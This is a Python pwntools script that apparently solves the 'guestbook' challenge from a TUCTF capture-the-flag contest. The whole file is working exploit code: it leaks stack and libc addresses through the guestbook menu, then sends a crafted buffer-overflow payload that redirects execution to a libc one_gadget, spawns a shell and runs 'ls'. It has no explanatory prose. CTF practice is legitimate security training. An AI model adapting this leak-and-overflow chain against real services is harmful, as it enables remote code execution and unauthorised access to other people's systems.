from pwn import *

# Addresses
system = 0x3cc50
one_gadget = 0x136dbe

context.log_level = 'debug'

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('guestbook.tuctf.com', 4545)
    
    # Fill in names
    exploit = 'A' * 128
    r.sendline(exploit)

    # Get stack address
    r.recvuntil('3. Quit')
    r.sendline('1')
    r.recvuntil('>>>')
    r.sendline('6')

    # Get var
    leak = r.recvuntil('3. Quit')
    stack = u32(leak[24:28])
    libc = u32(leak[20:24]) - system #system is libc off
    log.info(hex(stack))
    log.info(hex(libc))

    # Buffer overflow
    r.sendline('2')
    r.recvuntil('you want to change?')
    r.sendline('0')
    r.recvuntil('the new guest.')
    exploit = 'B' * 100
    exploit += '\x00' * 8
    exploit += p32(stack - 0x64)
    exploit += 'C'*28
    exploit += p32(libc)*4
    exploit += p32(libc + one_gadget)
    
    log.info(hex(libc + one_gadget))

    r.sendline(exploit)
    r.sendline('3')
    r.recvuntil('3. Quit')
    r.sendline('3')
    r.sendline('ls')
    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
